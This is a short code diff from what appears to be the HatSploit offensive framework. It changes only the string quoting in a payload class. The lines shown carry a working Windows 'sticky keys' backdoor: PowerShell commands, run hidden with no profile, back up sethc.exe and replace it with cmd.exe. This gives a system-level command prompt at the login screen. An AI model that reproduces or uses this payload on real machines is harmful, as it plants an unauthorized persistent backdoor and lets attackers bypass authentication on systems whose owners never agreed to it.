@@ -23,8 +23,8 @@ class HatSploitPayload(Payload):
         })
 
     def run(self):
-        backup_command = "Copy-Item -Path \"$env:windir\\system32\\sethc.exe\" -Destination \"$env:windir\\system32\\sethc.bak\" -Force"
-        replace_command = "Copy-Item -Path \"$env:windir\\system32\\cmd.exe\" -Destination \"$env:windir\\system32\\sethc.exe\" -Force"
+        backup_command = 'Copy-Item -Path "$env:windir\\system32\\sethc.exe" -Destination "$env:windir\\system32\\sethc.bak" -Force'
+        replace_command = 'Copy-Item -Path "$env:windir\\system32\\cmd.exe" -Destination "$env:windir\\system32\\sethc.exe" -Force'
 
         backup_payload = f"powershell -w hidden -nop -c \"{backup_command}\""
         replace_payload = f"powershell -w hidden -nop -c \"{replace_command}\""
